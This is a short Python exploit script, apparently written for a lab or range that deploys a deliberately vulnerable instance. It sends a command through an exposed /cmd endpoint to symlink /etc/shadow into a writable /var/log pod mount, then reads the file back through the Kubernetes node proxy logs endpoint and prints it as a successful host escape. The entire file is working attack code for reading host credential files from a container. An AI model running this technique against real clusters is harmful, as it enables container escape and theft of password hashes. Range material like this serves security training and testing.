import time
import requests

def _wait_for_simulator(url: str, timeout: int = 300) -> None:
    print("[*] Waiting for simulator to become ready...")
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            requests.get(f"{url}/health", timeout=3)
            print("[+] Simulator is ready.")
            return
        except Exception:
            time.sleep(10)
    raise RuntimeError(f"Simulator at {url} did not become ready within {timeout}s")

def run(outputs: dict, region: str = "us-east-1") -> None:
    ip = outputs.get("vuln_instance_ip")
    if not ip:
        raise RuntimeError("Missing vuln_instance_ip stack output.")

    url = f"http://{ip}:8080"
    _wait_for_simulator(url)

    print("[*] Phase 1: Creating symlink inside the writable mount /var/log")
    log_path = "/var/log/pods/webapp.log"
    target_file = "/etc/shadow"
    cmd_payload = f"ln -s {target_file} {log_path}"

    try:
        resp = requests.post(f"{url}/cmd", data={"cmd": cmd_payload}, timeout=10)
        print(f"[+] Pod output: {resp.text.strip()}")
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return

    print("[*] Phase 2: Fetching Node logs via Kubelet/API proxy subresource")
    try:
        resp = requests.get(f"{url}/api/v1/nodes/worker-1/proxy/logs", params={"path": log_path}, timeout=10)
        if resp.status_code == 200:
            print("[+] Host escape successful! Read contents of /etc/shadow:")
            print(resp.text)
        else:
            print(f"[-] Log fetch failed with status code {resp.status_code}")
    except Exception as e:
        print(f"[-] Log fetch request failed: {e}")
